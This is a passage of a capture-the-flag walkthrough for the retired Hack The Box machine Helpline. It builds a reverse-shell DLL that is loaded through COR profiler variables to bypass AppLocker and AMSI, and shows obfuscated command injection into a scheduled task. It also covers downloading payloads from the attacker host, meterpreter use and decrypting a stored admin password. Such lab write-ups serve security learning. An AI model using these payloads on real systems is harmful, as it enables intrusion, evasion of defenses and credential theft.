I did a post on [COR Profilers](/2019/03/15/htb-ethereal-cor.html) back when [Ethereal](/2019/03/09/htb-ethereal.html) retired, thinking it would come in handy in the future, and it paid off here. This was a method to bypass AppLocker / AMSI / CLM (for more details, read the post). If I can get leo to run this, I’ll get back a solid shell.

I’ll need to build a DLL. I’m already working out of a Windows VM, and Commando installed Visual Studio already. I’ll open it, and install the Visual C++ modules by going to “Tools” -> “Get Tools and Features”, select “Desktop development with C++”, and then hit the “Modify” button. After several minutes, that installs, and Visual Studio restarts.

Now I select “New “ -> “Project”. In the box that pops up I’ll select “Windows Desktop” under “Visual C++”, and then “Dynamic-Link Library (DLL)”. I’ll give it a name (I’m using “rev\_shell\_dll”), and hit ok.

I’ll find a [C++ reverse shell](https://raw.githubusercontent.com/tudorthe1ntruder/reverse-shell-poc/master/rs.c) to use, and paste that into `rev_shell_dll.cpp`. I’ll change the main line to `void rev_shell()`. I also made a few tweaks so that it would read the callback host ip and port from environment variables. I’ve got the source for this dll on [my Gitlab page](https://gitlab.com/0xdf/ctfscripts/tree/master/rev_shell_dll).

I’ll add a header file, `rev_shell_dll.h`, and it will contain:

```

#pragma once
void rev_shell();

```

The project already created a `dllmain.cpp`. I’ll open it, and I can see the code for dllmain, which will run when the library is loaded. There’s a switch based on the `ul_reason_for_call`, but all the options are currently empty.

I’ll add `#include "rev_shell_dll.h"` to the top, and a call to `rev_shell()` in the case of `DLL_PROCESS_ATTACH`:

```

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "rev_shell_dll.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		rev_shell();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

I’ll make sure its set to “Release” and “x64”, and then select “Build” -> “Build Solution”. The Output panel tells me that it built, and where the dll is:

![1555180266979](https://0xdfimages.gitlab.io/img/1555180266979.png)

I can test it locally:

```

PS C:\Users\0xdf > cmd /c 'set "COR_ENABLE_PROFILING=1" & set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" & set "COR_PROFILER_PATH=C:\Users\0xdf\source\repos\rev_shell_dll\x64\Release\rev_shell_dll.dll" & set "RHOST=10.10.14.14" & set "RPORT=443" &tzsync'

```

```

C:\share>nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.14.14] 52592
Microsoft Windows [Version 10.0.17763.437]
(c) 2018 Microsoft Corporation. All rights reserved.

COMMANDO Sat 04/13/2019 19:32:10.43
C:\Users\0xdf>

```

### Shell

Now that I have the pieces, I’ll get a shell on Helpline.

I’ll create my payload on my local machine:

```

cmd /c 'set "COR_ENABLE_PROFILING=1" & set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" & set "COR_PROFILER_PATH=C:\windows\System32\spool\drivers\color\0xdf.dll" & set "RHOST=10.10.14.14" & set "RPORT=443" & tzsync'

```

With `python` webserver running locally, I’ll upload my dll and payload to Helpline, naming my payload `a`:

```

[helpline]: PS E:\Scripts> iwr -uri http://10.10.14.14/rev_shell_dll.dll -OutFile C:\windows\system32\spool\drivers\color\0xdf.dll
[helpline]: PS E:\Scripts> iwr -uri http://10.10.14.14/payload -OutFile .\a

```

Now, with a `nc` listener waiting, I’ll set `backups.txt` to be my tab based command:

```

[helpline]: PS E:\Scripts> echo ";`$c=get-content`ta;iex`t`$c;#" > backups.txt
[helpline]: PS E:\Scripts> cat .\backups.txt
;$c=get-content a;iex     $c;#

```

When the scheduled task runs, I get a callback:

```

C:\Users\0xdf\hackthebox\helpline-10.10.10.132>nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.132] 49738
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

E:\Scripts>whoami
helpline\leo

```

I can also show the other filter bypass. With the same `a` file still there, I’ll create another `backups.txt`:

```

echo ';$c=$backup[1]+$backup[5]+$backup[3]+$backup[2]+$backup[6]+$PSSessionConfigurationName[2]+$env:programfiles[10]+$backup[6]+$backup[0]+$backup[-5]+$backup[-4]+$backup[-3]+$env:programfiles[10]+$backup[1]+$backup[5];$c|iex;#' > backups.txt

```

After a few minutes:

```

C:\Users\0xdf\hackthebox\helpline-10.10.10.132>nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.132] 49740
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

E:\Scripts>whoami
helpline\leo

```

## Shell as administrator

With a shell as leo, I’ll notice the file `admin-pass.xml` on his desktop:

```

C:\Users\leo\Desktop>type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

```

Given the filename and that data, that looks like a PowerShell secure string. If that’s the case, it will only be accessibly in the context of the user who created it, which I’m going to guess is leo.

My current shell isn’t stable enough to run a PowerShell session within it. I could either try to get a more stable PowerShell shell, or work from here.

I’ll swap [beryllium](https://github.com/attl4s/pruebas/blob/master/Beryllium.dll) in for my dll to get a meterpreter shell, and use meterpreter’s powershell mod:

```

meterpreter > load powershell
Loading extension powershell...Success.   
meterpreter > powershell_shell 

PS C:\users\leo\desktop> $s = cat admin-pass.xml
$s = cat admin-pass.xml
PS C:\users\leo\desktop> $s
$s
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
PS C:\users\leo\desktop> $ss = Convertto-securestring -string $s
$ss = Convertto-securestring -string $s
PS C:\users\leo\desktop> $ss
$ss
System.Security.SecureString
PS C:\users\leo\desktop> (New-Object System.Management.Automation.PSCredential 'N/A', $ss).GetNetworkCredential().Password
(New-Object System.Management.Automation.PSCredential 'N/A', $ss).GetNetworkCredential().Password
mb@letmein@SERVER#acc

```

Now with that password, I’ll get a connection as administrator (with `CredSSP`, as `root.txt` is also encrypted):

```

PS C:\Users\0xdf > Enter-PSSession -ComputerName helpline -Credential helpline\administrator -Authentication Credssp

Windows PowerShell credential request
Enter your credentials.
Password for user helpline\administrator: *********************

[helpline]: PS C:\Users\Administrator\Documents> cd ..\Desktop\
[helpline]: PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/20/2018  11:09 PM             32 root.txt

[helpline]: PS C:\Users\Administrator\Desktop> type root.txt
d814211f...

```